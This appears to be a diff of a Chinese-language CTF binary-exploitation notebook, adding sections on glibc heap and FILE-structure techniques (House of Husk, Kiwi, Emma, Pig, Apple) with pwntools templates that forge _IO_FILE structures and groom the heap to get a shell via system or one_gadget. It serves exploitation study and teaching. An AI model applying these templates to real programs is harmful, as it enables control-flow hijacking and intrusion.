@@ -403,6 +403,8 @@ addr = u64(io.recv(8)) - 10
 # 自使用获取栈地址stack addr 0x10需自调整
 addr = io.recvuntil(',')[:-1]
 ebp_addr = int("0x" + str(addr[::-1].hex()), 16) - 0x10
+libc.addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - offset
+heap_base = u64(p.recvuntil(('\x55', '\x56'))[-6:].ljust(8, '\x00'))&~0xFFF
     
 # 32位
 u32(p.recvuntil("\xf7")[-4:].ljust(4, "\x00"))
@@ -972,6 +974,8 @@ CPU包含4个层：Ring0-Ring4，Ring3为用户态，Ring0为内核态
 - glibc-2.29：ubuntu19.04
 - glibc-2.30~31：ubuntu20.04
 - glibc-2.34：ubuntu22.04
+  - 删除了malloc-hook，exit-hook等一系列hook
+
 
 **ubuntu**下查看`glibc`版本
 
@@ -5818,7 +5822,7 @@ free(1) # getshell
 
 ```Python
 new(0x240) # chunk0
-edit(1, p64(heap_base + 0x10)) # fd字段
+edit(1, p64(heap_base + 0x10)) # fd字段，高版本需要target异或值
 new(0x240) # chunk0
 new(0x240) # 劫持tcache结构体
 edit(p8(7) * 64 + p64(0xdeadbeef) * 64) # 覆盖count 以及 tcache_entry, deadbeef改为target地址
@@ -6120,38 +6124,7 @@ if (fwd != bck){
 
 ![image-20241127132408572](/img/pwn_note.zh-cn.assets/image-20241127132408572.png)
 
-#### mp_ struct attack
 
-- 修改掉 `tcache_bins`：# 只允许的最大tcache chunk大小，释放的小于`mp_.tcache_bins`的`chunk`会被当作`tcache bin`处理，可以把很大的 `chunk` 用 `tcachebin` 管理
-- 修改掉 `tcache_count`： 可以控制链表的 `chunk` 的数量
-
-```Python
-tcache_bins = mp_ + 80
-tcache_max_bytes = mp_ + 88
-```
-
-![img](/img/pwn_note.zh-cn.assets/-172844676894978.assets)
-
-- **任意地址写**堆地址：`large bin`链表中并没有对`fd_nextsize`和`bk_nextsize`进行双向链表完整性的检查，通过改写`large bin`的`bk_nextsize`的值来向**指定的位置+0x20**的位置写入一个**堆地址，即很大的值，使得下次`free`时堆块将进入`tcache`处理**
-- 通过uaf `browse`出`fd`的值，对堆块进行填充时fd保持不变，而更改`bk_nextsize`和`fd_nextsize`的值,覆写`malloc`中`tcache`部分的`mp_.tcache_bins`的值为一个很大的地址
-
-```Python
-change(5, p64(fd) * 2 + p64(mp_addr + 0x50 - 0x20) * 2)
-create(41, 0x900, b'') # 用于触发漏洞，当unsorted bin 遍历将其转入 large bins 更改 tcache_bins 
-delete(9) # 将会使得该堆块进入tcache bin中
-```
-
-**因为溢出和tcache struct内容存放在堆空间上的缘故，需要伪造的结构内容会落在我们的可控堆块上，由于0x500（9号堆块）实在太大，导致tcache bin 的链表头写到malloc顺序中的1号堆块中，可调试观察**
-
-![img](/img/pwn_note.zh-cn.assets/-172844676894979.assets)
-
-```Python
-change(1, p64(0) * 13 + p64(free_hook_addr)) # 将9号块位置修改为free_hook地址
-create(12, 0x500, p64(system_addr)) # 将拿tcache堆块，即向free_hook处创建堆块，覆盖为system地址
-delete(10) # 10号堆块提前写入内容'/bin/sh' 完成getshell
-```
-
-- 覆写`free_hook`为`system`，进而getshell
 
 ### Unsorted bin attack
 
@@ -6901,6 +6874,7 @@ if (victim == bin){
 **条件**
 
 - 需要泄露libc基址和堆地址，同一系统多次启动 ld 和 libc 的偏移相对固定，而远程需要爆破
+- 只用一次任意地址写，large bin attack，攻击`rtld_global`结构体
 
 **原理**
 
@@ -7953,6 +7927,637 @@ add_chunk(4, 0x500) # 触发报错
 ```
 
 glibc-2.27 开始，abort 函数改动，不再调用 `_IO_flush_all_lockp` 函数，因此不能利用 malloc_printerr 实现程序执行流劫持
+
+#### House of Husk
+
+- 利用`printf`自定义格式化字符串相关函数
+- glibc中通过`__register_printf_function`为`printf`格式化字符串中的`spec`(%d中的d)注册对应函数
+- 维护字符与函数映射关系只通过`__printf_function_table`和`__printf_arginfo_table`2指针访问
+
+**其中，两个表均为glibc中全局变量，各自都包含0x100项且相邻，每一个项0x8字节，类似哈希表，spec对应值偏移处放入函数或参数指针**
+
+**printf**
+
+两种调用：`__parse_one_specmb`中的调用及`printf_positional`中的调用
+
+1. `printf`调用 `__printf`，接着调用`__vfprintf_internal`，其中先调用`buffered_vfprintf`
+
+2. 返回`__vfprintf_internal`调用`printf_positional`
+
+3. ```c
+   function_done = __printf_function_table[(size_t) spec]// 调用function_table中函数
+           (s, &specs[nspecs_done].info, ptr);
+   ```
+
+4. 以及在`printf_positional`中调用`__parse_one_specmb`
+
+5. ```c
+   if (__builtin_expect (__printf_function_table == NULL, 1) // 覆盖后不满足
+     || spec->info.spec > UCHAR_MAX // 不满足
+     || __printf_arginfo_table[spec->info.spec] == NULL // 覆盖后不满足
+       		// 调用info.spec中函数，后一行为参数
+     || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
+               (&spec->info, 1, &spec->data_arg_type, &spec->size) 
+        ) < 0)
+   ```
+
+在两个函数中都会调用函数，劫持`__printf_function_table`和`__printf_arginfo_table`指针写入one_gadget获取shell
+
+**利用**
+
+![image-20250121225208401](/img/pwn_note.zh-cn.assets/image-20250121225208401.png)
+
+- unsorted bin 泄露 liibc 基址
+
+- 修改 `global_max_fast`为极大值
+
+- 可利用`House of Corrosion`将`__printf_function_table`和`__printf_arginfo_table`值覆盖成释放堆块的内存指针，构造：
+
+  - `__printf_function_table`覆盖为非0值，通过`vfprintf`中判断使调用`printf_positional`
+
+  - `__printf_function_table`或`__printf_arginfo_table`相应偏移处指向写有one_gadget的内存指针
+
+  - 若利用`__printf_function_table`触发需要`__printf_arginfo_table`指向内存且该内存对应spec偏移处为NULL
+
+- 调用`printf`触发漏洞
+
+```python
+add_chunk(4, (libc.sym['__printf_arginfo_table'] - (libc.sym['main_arena'] + 0x10)) * 2 + 0x10)
+add_chunk(5, (libc.sym['__printf_function_table'] - (libc.sym['main_arena'] + 0x10)) * 2 + 0x10)
+# 经过ASCII码值偏移个8字节的NULL，one_gadget
+edit_chunk(4, (ord('d') * 8 - 0x10) * b'\x00' + p64(one_gadget)) # 可修改4也可修改5
+ 
+# 释放到 fast bin 中，即利用 House of Corrosion修改两个指针为对应chunk地址
+delete_chunk(4)
+delete_chunk(5)
+# 最终触发printf("%d",xx)即可
+```
+
+#### House of Kiwi
+
+**背景**
+
+调用`exit`退出可通过劫持`vtable`上`_IO_overflow`劫持：FSOP
+
+调用`_exit`退出直接系统调用不经过IO清理工作，需主动触发异常退出来调用`vtable`上相关函数
+
+调用`read`或`write`不会走IO而直接走系统调用
+
+**条件**
+
+- <glibc-2.35，某些glibc版本`_IO_file_jumps`地址所在段可写
+
+- 利用`sysmalloc`中的`assert`
+
+- ```c
+  assert ((old_top == initial_top (av) && old_size == 0) ||
+        ((unsigned long) (old_size) >= MINSIZE &&
+         prev_inuse (old_top) &&
+         ((unsigned long) old_end & (pagesize - 1)) == 0));
+  ```
+
+- assert不满足将调用`__malloc_assert`，利用其中的`fflush (stderr)`
+
+- 最终通过`_IO_fflush`中的`_IO_SYNC`，调用vtable中的`__sync`函数指针
+
+`_IO_SYNC`对应汇编部分内容
+
+将`_IO_file_jumps_`对应`_IO_new_file_sync`函数指针位置覆盖为one_gadget
+
+```assembly
+mov rbp, qword ptr [rbx + 0xd8] ; rbp指向 __GI__IO_file_jumps_
+...
+call qword ptr [rbp + 0x60] ; 调用_IO_new_file_sync
+```
+
+**利用**
+
+- 泄露堆地址，利用tcache相关攻击，任意地址malloc到`tcache_perthread_struct`，修改count为0x7
+- unsorted bin leak泄露libc基址，任意地址写修改`_IO_file_jumps`为`one_gadget`
+- 或修改`_IO_file_jumps`某偏移处为`system`，修改`_IO_2_1_stderr_`（实则为参数rdi值）为`/bin/sh`
+- 最终破坏 top chunk 结构（size改为0），然后申请新堆块触发assert即可
+
+**ORW利用**
+
+若无法execve系统调用，需借助setcontext，根据rdx指向内存区域设置，调用`_IO_new_file_sync`时rdx指向`_IO_helper_jumps`结构(可写)，在该结构处伪造setcontext+offset实现ORW
+
+call的地址改为`&(setcontext+offset)`，修改`__start___libc_IO_vtables`为`SigreturnFrame`，实际改的是`_IO_helper_jumps`，其中有些地址不可随意覆盖，以调试报错为准，设置 rsp 指向提前布置号的 rop 的起始位置，同时设置 rip 指向 `ret` 指令
+
+**glibc-2.36开始**`__malloc_assert`不再调IO而是直接系统调用`sys_writev`，方法失效
+
+```c
+_Noreturn static void
+__malloc_assert (const char *assertion, const char *file, 
+                 unsigned int line, const char *function){
+  __libc_message (do_abort, "\
+Fatal glibc error: malloc assertion failure in %s: %s\n",
+          function, assertion);
+  __builtin_unreachable ();
+}
+```
+
+#### House of Emma
+
+- <glibc-2.35
+- 利用`_IO_jump_t`类型的函数表`_IO_cookie_jumps`，包括`read,write,seek,close`函数，需要绕过指针保护 `PTR_DEMANGLE`
+- 汇编可知：宏定义操作将函数指针循环右移11位，并与`fs:[0x30]`异或得到真正函数地址
+- `fs:[0x28]`为tls上存储的canary，根据`tcbhead_t`结构体定义`fs:[0x30]`为`pointer_guard`用于加密
+
+可通过gdb中命令`canary`以及`search -8 canary_value`找到tls地址
+
+**利用**
+
+- 泄露堆地址、libc基址，large bin attack 在 tls对应`pointer_guard`上写一个堆地址来绕过指针保护
+- 覆盖`stderr`为堆地址，同House of Kiwi，伪造`_IO_cookie_file`，修改vtable函数指向的指针
+- 改坏 top chunk 通过`__malloc_assert`触发漏洞，且可结合setcontext利用rop
+
+![image-20250122182857674](/img/pwn_note.zh-cn.assets/image-20250122182857674.png)
+
+**调用链**：
+
+`__malloc_assert` -> `__fxprintf` -> `__vfxprintf` -> `locked_vfxprintf` -> `__vfprintf_internal`
+
+`__vfprintf_internal`实际调用`vprintf`，其中`outstring`函数最终调用了`PUT`，为IO调用，调用vtable指针
+
+```c
+outstring ((const UCHAR_T *) format, lead_str_end - (const UCHAR_T *) format);
+ 
+#define outstring(String, Len)                          \
+    do {                                                \
+        const void *string_ = (String);                 \
+        done = outstring_func(s, string_, (Len), done); \
+        if (done < 0)                                   \
+            goto all_done;                              \
+    } while (0)
+ 
+# define PUT(F, S, N)   _IO_sputn ((F), (S), (N)) 
+ 
+static inline int
+outstring_func (FILE *s, const UCHAR_T *string, size_t length, int done)
+{
+  assert ((size_t) done <= (size_t) INT_MAX);
+  if ((size_t) PUT (s, string, length) != (size_t) (length))
+    return -1;
+  return done_add_func (length, done);
+}
+```
+
+此时调用PUT实际调用了`_IO_cookie_write`，调用后write指向加密后的setcontext中转gadget，参数`_cookie`为伪造的`SigreturnFrame`地址处
+
+```assembly
+call qword ptr [rbx + 0x38] ; _IO_cookie_write
+```
+
+接着解密write指针值，获取到中转gadget地址，进入后最终`call <setcontext+offset`，设置寄存器后栈迁移到堆上进行ORW_ROP
+
+**模板**
+
+```python
+fake_file = b""
+fake_file += p64(0)  # _IO_read_end
+fake_file += p64(0)  # _IO_read_base
+fake_file += p64(0)  # _IO_write_base
+fake_file += p64(0)  # _IO_write_ptr
+fake_file += p64(0)  # _IO_write_end
+fake_file += p64(0)  # _IO_buf_base;
+fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
+fake_file += p64(0) * 4  # from _IO_save_base to _markers
+fake_file += p64(0)  # the FILE chain ptr
+fake_file += p32(2)  # _fileno for stderr is 2
+fake_file += p32(0)  # _flags2, usually 0
+fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
+fake_file += p16(0)  # _cur_column
+fake_file += b"\x00"  # _vtable_offset
+fake_file += b"\n"  # _shortbuf[1]
+fake_file += p32(0)  # padding
+fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
+fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
+fake_file += p64(0)  # _codecvt, usually 0
+fake_file += p64(libc.sym['_IO_2_1_stdout_'] - 0x160)  # _IO_wide_data_1
+fake_file += p64(0) * 3  # from _freeres_list to __pad5
+fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
+fake_file += b"\x00" * 19  # _unused2
+fake_file = fake_file.ljust(0xD8 - 0x10, b'\x00')  # adjust to vtable
+# fake vtable call [reg + xx] 如图调整偏移
+fake_file += p64(libc.sym['_IO_cookie_jumps'] + 0x40)  
+# 继承增加内容
+fake_file += p64(frame_addr) # __cookie
+fake_file += p64(0)  # read
+# 利用setcontext中转相关的gadget的地址与file_addr异或，类似于与pointer_guard异或，然后循环左移
+fake_file += p64(rol(libc.search(asm('mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]'), executable=True).__next__() ^ file_addr, 0x11))  # write
+fake_file += p64(0)  # seek
+fake_file += p64(0)  # close
+```
+
+#### House of Pig
+
+适用于calloc分配内存情况，当tcache中有chunk，仍会从fastbin或small bin等中拿chunk
+
+##### glibc<2.34
+
+- 利用 tcache stash unlink 与 largebin attack 劫持`_IO_list_all`然后伪造IO_FILE结构体
+- 劫持`vtable`到`_IO_str_jumps`上，程序退出利用`_IO_str_overflow`的`malloc`完成攻击
+- 以及`memcpy`在`__free_hook`处写入system地址，利用free获取shell
+
+为让 `_IO_flush_all_lockp` 能调用执行到 `_IO_OVERFLOW` 从而调用 `_IO_str_overflow` ，需要满足：
+
+- `fp->_mode <= 0`以及`fp->_IO_write_ptr > fp->_IO_write_base`
+
+**利用**
+
+① 泄露堆地址、libc地址
+
+② 将一个 chunk 释放进入 large bin ，利用 large bin attack 将`_IO_list_all`指向该 chunk 以及将`__free_hook-0x8`指向该 chunk
+
+③ 向 tcache bin 放入5个 chunk，通过计算(2*(_IO_buf_end - _IO_buf_base) + 100 = 0x94)来作为大小
+
+④ 向 small bin 中放入2个 chunk，修改 bk 指向`__free_hook - 0x20`
+
+```python
+add(1, 0x418)
+add(2, 0x18)
+add(3, 0x418)
+add(3, 0x18)
+free(1)
+free(3) # chunk1, 3 进入 unsorted bin 中
+
+# 其中一个 chunk 切割后进入unsorted bin中，另一个chunk 进入large bin中
+add(1, 0x420 - 0xa0) 
+# large bin中chunk切割后进入unsroted bin中，unsorted bin中chunk进入small bin
+add(3, 0x420 - 0xa0)
+# unsorted bin 中 chunk 进入 small bin中
+add(4, 0xa0) 
+```
+
+![image-20250122210010100](/img/pwn_note.zh-cn.assets/image-20250122210010100.png)
+
+⑤ 申请一个chunk触发tcache stash unlink，使得tcache 直接指向`__free_hook-0x10`
+
+```python
+add(10, 0x94)
+```
+
+​	![image-20250122210209656](/img/pwn_note.zh-cn.assets/image-20250122210209656.png)
+
+⑥ 伪造chunk，最终退出exit触发
+
+**调用过程**
+
+- 退出触发`_IO_flush_all_lockp`->`_IO_str_overflow`
+  - `new_buf = malloc (new_size)`将会从tcache中申请出包含`__free_hook`的chunk
+  - `memcpy (new_buf, old_buf, old_blen)`将伪造的`_IO_buf_base`处拷贝到chunk中
+  - 此时`__free_hook`被覆盖为`system`，old_buf处为`'/bin/sh'`
+  - `free (old_buf)`释放时相当于调用system函数，old_buf中为参数`/bin/sh`，获取shell
+
+![image-20250122211820980](/img/pwn_note.zh-cn.assets/image-20250122211820980.png)
+
+**模板**
+
+```python
+fake_file_addr = heap_base + 0x6d0
+n64 = lambda x: (x + 0x10000000000000000) & 0xFFFFFFFFFFFFFFFF
+fake_file = b""
+fake_file += p64(0)  # _IO_read_end
+fake_file += p64(0)  # _IO_read_base
+fake_file += p64(1)  # _IO_write_base
+fake_file += p64(n64(-1))  # _IO_write_ptr
+fake_file += p64(0)  # _IO_write_end
+fake_file += p64(fake_file_addr + 0xe0)  # _IO_buf_base;
+fake_file += p64(fake_file_addr + 0xe0 + 8 * 3)  # _IO_buf_end should usually be (_IO_buf_base + 1)
+fake_file += p64(0) * 4  # from _IO_save_base to _markers
+fake_file += p64(libc.sym['_IO_2_1_stdout_'])  # the FILE chain ptr
+fake_file += p32(2)  # _fileno for stderr is 2
+fake_file += p32(0)  # _flags2, usually 0
+fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
+fake_file += p16(0)  # _cur_column
+fake_file += b"\x00"  # _vtable_offset
+fake_file += b"\n"  # _shortbuf[1]
+fake_file += p32(0)  # padding
+fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
+fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
+fake_file += p64(0)  # _codecvt, usually 0
+fake_file += p64(libc.sym['_IO_2_1_stdout_'] - 0x160)  # _IO_wide_data_1
+fake_file += p64(0) * 3  # from _freeres_list to __pad5
+fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
+fake_file += b"\x00" * 19  # _unused2
+fake_file = fake_file.ljust(0xD8 - 0x10, b'\x00')  # adjust to vtable
+fake_file += p64(IO_str_jumps)  # fake vtable
+fake_file += '/bin/sh\x00'
+fake_file += p64(0)
+fake_file += p64(libc.sym['system'])
+```
+
+##### glibc>2.33
+
+- glibc-2.34 起取消了 ptmalloc 中各种 hook，`_IO_str_overflow`中`memcpy`实际通过got表调用
+- 构造多个`_IO_FILE`链将`memcpy@got`改写成`&system`，调用memcpy获取shell
+- 通过gdb命令`u _IO_str_overflow`中`call *ABS*+0xabc@plt`指令所在地址中实际call的地址0xbcd，`u 0xbcd`中`bnd jmp qword ptr [rip + offset]`找到的地址处找到memcpy@got表地址
+
+**利用**
+
+![image-20250123202353253](/img/pwn_note.zh-cn.assets/image-20250123202353253.png)
+
+- 泄露libc基址、堆地址，将chunk 2：fake_file1 置入 largebin 中
+
+```python
+add(0, 0x418) # fake_file2
+add(1, 0x288) # fake tcache_pthread_struct
+add(2, 0x428) # fake_file1
+add(3, 0x418) # fake_file3
+add(4, 0x418) # fake_file4
+add(5, 0x50) # memcpy data: /bin/sh, system
+
+free(2)
+free(0)
+add(0, 0x418) # chunk2 进入 large bin
+```
+
+- large bin attack 将`_IO_list_all` 修改为 chunk 2的地址，此时，编辑fake_file1，将其`_IO_buf_base`指向`tcache_perthread_struct`，且`_chain`指向fake_file2
+
+```python
+# find _IO_str_jumps
+IO_file_jumps = libc.symbols['_IO_file_jumps']
+IO_str_underflow = libc.symbols['_IO_str_underflow'] - libc.address
+IO_str_underflow_ptr = list(libc.search(p64(IO_str_underflow)))
+IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + 0x20)] - 0x20
+
+fake_file1 = b""
+fake_file1 += p64(0)  # _IO_read_end
+fake_file1 += p64(0)  # _IO_read_base
+fake_file1 += p64(1)  # _IO_write_base
+fake_file1 += p64(n64(-1))  # _IO_write_ptr
+fake_file1 += p64(0)  # _IO_write_end
+fake_file1 += p64(tcache_pthread_struct_addr)  # _IO_buf_base;
+fake_file1 += p64(tcache_pthread_struct_addr)  # _IO_buf_end should usually be (_IO_buf_base + 1)
+fake_file1 += p64(0) * 4  # from _IO_save_base to _markers
+fake_file1 += p64(file2_addr)  # the FILE chain ptr
+fake_file1 += p32(2)  # _fileno for stderr is 2
+fake_file1 += p32(0)  # _flags2, usually 0
+fake_file1 += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
+fake_file1 += p16(0)  # _cur_column
+fake_file1 += b"\x00"  # _vtable_offset
+fake_file1 += b"\n"  # _shortbuf[1]
+fake_file1 += p32(0)  # padding
+fake_file1 += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
+fake_file1 += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
+fake_file1 += p64(0)  # _codecvt, usually 0
+fake_file1 += p64(libc.sym['_IO_2_1_stdout_'] - 0x160)  # _IO_wide_data_1
+fake_file1 += p64(0) * 3  # from _freeres_list to __pad5
+fake_file1 += p32(0xFFFFFFFF)  # _mode, usually -1
+fake_file1 += b"\x00" * 19  # _unused2
+fake_file1 = fake_file1.ljust(0xD8 - 0x10, b'\x00')  # adjust to vtable
+fake_file1 += p64(IO_str_jumps)  # fake vtable
+```
+
+- 构造fake_file2，板子同上，区别为``_IO_buf_base`指向`fake tcache_perthread_struct`，`_IO_buf_end`设置为`fake tcache_perthread_struct + (0x288 - 0x100) / 2`，会用到memcpy拷贝，且`_chain`指向fake_file3，且编辑fake tcache_perthread_struct即chunk1
+- 构造fake_file3，`_chain`指向fake_file4，``_IO_buf_base`指向`chunk5`，构造chunk5为sh字符串以及system函数地址
+- 退出时触发
+
+**调用过程**
+
+- 第一个`_IO_FILE`由`_IO_flush_all`调用`_IO_str_overflow`中的free函数将`tcache_perthread_struct`释放
+- 第二个`_IO_FILE`先调用`_IO_str_overflow`中malloc函数将`tcache_perthread_struct`申请出来，调用`memcpy`用`fake tcache_perthread_struct`内容控制`tcache_perthread_struct`中的数据，使其中`entries`指向`&memcpy@got - 0x10`，使得后续可以通过size等比计算从相应位置申请出来
+- 第三个`_IO_FILE`调用`_IO_str_overflow`中malloc函数将`&memcpy@got - 0x10`申请出来，用`memcpy`将`memcpy@got`覆盖为system函数地址，将`&memcpy@got - 0x10`处写入`/bin/sh`字符串
+- 第四个`_IO_FILE`调用malloc将`&memcpy@got - 0x10`申请出来，调用memcpy即调用`system("/bin/sh")`
+
+#### House of Apple
+
+##### House of Apple1
+
+- glibc>2.34，只有一次任意地址写（large bin attack）进行FSOP
+- 需泄露libc基址和堆地址，且从main函数返回或调用`exit`函数
+
+**原理**
+
+main函数返回调用链：`exit` > `fcloseall` > `_IO_cleanup` > `_IO_flush_all_lockp` > `_IO_OVERFLOW`
+
+遍历`_IO_list_all`存放的每一个`IO_FILE`结构体，调用`vtable->_overflow`指针指向的函数，劫持`_IO_list_all`替换为伪造`IO_FILE`，利用`_IO_FILE`的成员`_wide_data`，`struct _IO_wide_data *_wide_data`在`_IO_FILE`中偏移为0xa0
+
+`overflow_buf`相对于`_IO_FILE`结构体的偏移为`0xf0`
+
+- 伪造`_wide_data`，在`_IO_wstrn_overflow`函数中可将已知地址空间上某值修改为一个已知值
+- 由`_IO_wstrn_overflow`可控制从`fp->_wide_data`开始一定范围内的内存值，等价于**任意地址写已知地址**
+
+**利用**
+
+堆伪造`_IO_FILE`结构体，且已知其地址为**A**，将**A+0xd8**替换为`_IO_wstrn_jumps`地址，**A+0xc0**设置为**B**，设置其他成员以能调用到`_IO_OVERFLOW`，`exit`会一路调用到`_IO_wstrn_overflow`，将**B**至**B+0x38**的地址区域内容替换为**A+0xf0**或**A+0x1f0**
+
+**绕过**：
+
+- `f->_wide_data->_IO_buf_base`为空或`f->_flags2 & _IO_FLAGS2_USER_WBUF`不为0，其中`_IO_FLAGS2_USER_WBUF`为8，绕过`_IO_wsetb`函数中的`free`函数
+
+- ```c
+  free(f->_wide_data->_IO_buf_base)
+  ```
+
+- 满足`fp->_wide_data->_IO_buf_base != snf->overflow_buf`进入`_IO_wstrn_overflow`的`if`判断
+
+- 满足`fp->_mode <= 0`以及`fp->_IO_write_ptr > fp->_IO_write_base`可用于FSOP触发
+
+**思路**
+
+① 修改tcache线程变量
+
+- 伪造至少2个`_IO_FILE`结构体
+- 第一个`_IO_FILE`执行`_IO_OVERFLOW`利用`_IO_wstrn_overflow`修改`tcache`全局变量为已知值，控制`tcache bin`分配
+- 第二个`_IO_FILE`执行`_IO_OVERFLOW`利用`malloc`任意地址分配并使用`memcpy`任意地址写任意值
+- 用2次任意地址写任意值修改`pointer_guard`，`IO_accept_foreign_vtables`值绕过`_IO_vtable_check`函数检测，或利用任意地址写修改`libc.got`函数地址，很多IO流函数调用`strlen/strcpy/memcpy/memset`会调用got表中函数
+- 利用一个`_IO_FILE`随意伪造vtable劫持也可
+
+② 修改`mp_`结构体
+
+- 至少伪造2个`_IO_FILE`结构体
+- 第一个`_IO_FILE`执行`_IO_OVERFLOW`利用`_IO_wstrn_overflow`修改`mp_.tcache_bins`为极大值，使得大chunk也通过`tcachebin`管理
+
+- 或修改掉`tcache_count`可以控制链表的 `chunk` 的数量
+
+```Python
+tcache_bins = mp_ + 80
+tcache_max_bytes = mp_ + 88
+```
+
+![img](/img/pwn_note.zh-cn.assets/-172844676894978.assets)
+
+③ 修改`pointer_guard`
+
+- 至少伪造2个`_IO_FILE`结构体
+- 第一个`_IO_FILE`执行`_IO_OVERFLOW`利用`_IO_wstrn_overflow`修改`tls`结构体`pointer_guard`值为已知值
+- 第二个`_IO_FILE`结构体用来做`house of emma`劫持程序执行流
+
+④ 修改`global_max_fast`全局变量
+
+##### House of Apple2
+
+四种利用可通过 gdb `tele &_IO_file_jumps`来找到对应四个函数地址
+
+① `_IO_wfile_overflow`
+
+- `_wide_data`结构中由类似`vtable`的`_wide_vtable`指向`_IO_jump_t`结构
+- glibc定义了调用`_wide_vtable`中函数的宏，其中`_IO_WSETBUF, _IO_WUNDERFLOW, _IO_WDOALLOCATE, _IO_WOVERFLOW`等缺少对`_wide_vtable`位置检查
+
+```c
+// _IO_wdoallocbuf函数中_IO_WDOALLOCATE宏
+((*(__typeof__ (((struct _IO_FILE){})._wide_data) *)(((char *) ((fp))) + __builtin_offsetof (struct _IO_FILE, _wide_data)))->_wide_vtable->__doallocate) (fp)
+```
+
+- 修改`vtable`，程序调用`_wide_vtable`中函数，再将`_wide_vtable`指向一个伪造函数表劫持执行流
+
+**利用**
+
+![image-20250124161719221](/img/pwn_note.zh-cn.assets/image-20250124161719221.png)
+
+- large bin attack劫持`_IO_list_all`为相应large bin chunk，在该large bin chunk伪造
+- exit退出触发
+
+**模板**
+
+前两个标志，`prev_size`设置为`0xfbad1880`，`size`设置为`;sh;`
+
+```python
+# file_addr为chunk地址
+IO_wide_data_addr = (file_addr + 0xd8 + 8) - 0xe0
+wide_vtable_addr = (file_addr + 0xd8 + 8 + 8) - 0x68
+
+fake_file = b""
+fake_file += p64(0)  # _IO_read_end
+fake_file += p64(0)  # _IO_read_base
+fake_file += p64(0)  # _IO_write_base
+fake_file += p64(1)  # _IO_write_ptr
+fake_file += p64(0)  # _IO_write_end
+fake_file += p64(0)  # _IO_buf_base;
+fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
+fake_file += p64(0) * 4  # from _IO_save_base to _markers
+fake_file += p64(0)  # the FILE chain ptr
+fake_file += p32(2)  # _fileno for stderr is 2
+fake_file += p32(0)  # _flags2, usually 0
+fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
+fake_file += p16(0)  # _cur_column
+fake_file += b"\x00"  # _vtable_offset
+fake_file += b"\n"  # _shortbuf[1]
+fake_file += p32(0)  # padding
+fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
+fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
+fake_file += p64(0)  # _codecvt, usually 0
+fake_file += p64(IO_wide_data_addr)  # _wide_data
+fake_file += p64(0) * 3  # from _freeres_list to __pad5
+fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
+fake_file += b"\x00" * 19  # _unused2
+fake_file = fake_file.ljust(0xD8 - 0x10, b'\x00')  # adjust to vtable
+fake_file += p64(libc.sym['_IO_wfile_jumps'])  # fake vtable
+fake_file += p64(wide_vtable_addr) # _wide_vtable
+fake_file += p64(libc.sym['system']) # doallocate
+```
+
+**调用链**：`_IO_wfile_overflow` > `_IO_wdoallocbuf` > `_IO_WDOALLOCATE` > `*(fp->_wide_data->_wide_vtable + 0x68)(fp)`
+
+```c
+wint_t _IO_wfile_overflow (FILE *f, wint_t wch){
+  if (f->_flags & _IO_NO_WRITES){ // 需要为0绕过
+      f->_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return WEOF;
+    }
+  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 // 需要进入
+      || f->_wide_data->_IO_write_base == NULL)
+    {
+      if (f->_wide_data->_IO_write_base == 0)
+	{
+	  _IO_wdoallocbuf (f);
+```
+
+```c
+void _IO_wdoallocbuf (FILE *fp)
+{
+  if (fp->_wide_data->_IO_buf_base) // 需要_IO_buf_base为0
+    return;
+  if (!(fp->_flags & _IO_UNBUFFERED))
+    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF) // 调用vtable指针表
+      return;
+```
+
+`fp`设置
+
+- `_flags`设为`~(2 | 0x8 | 0x800)`，若不需要控制`rdi`，设置为`0`即可；若要获得`shell`，设为`;sh;` 
+- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可
+- `_wide_data`设置为可控堆地址`A`，即`*(fp + 0xa0) = A`
+- `_wide_data->_IO_write_base`设置为`0`，即`*(A + 0x18) = 0`
+- `_wide_data->_IO_buf_base`设置为`0`，即`*(A + 0x30) = 0`
+- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即`*(A + 0xe0) = B`
+- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即`*(B + 0x68) = C`
+
+② `_IO_wfile_underflow_mmap`
+
+**利用**
+
+**调用链**：`_IO_wfile_underflow_mmap` > `_IO_wdoallocbuf` > `_IO_WDOALLOCATE` > `*(fp->_wide_data->_wide_vtable + 0x68)(fp)`
+
+板子在 `_IO_wfile_overflow`基础上更改`libc.sym['_IO_wfile_jumps']+0xa8`即可，具体需要动态调试确定
+
+**fp构造**
+
+- `_flags`设为`~4`，若不控制`rdi`，设为`0`即可；若要获得`shell`，可设为`sh;`，注意前面有个空格
+- `vtable`设置为`_IO_wfile_jumps_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_underflow_mmap`即可
+- `_IO_read_ptr < _IO_read_end`，即满足`*(fp + 8) < *(fp + 0x10)`
+- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
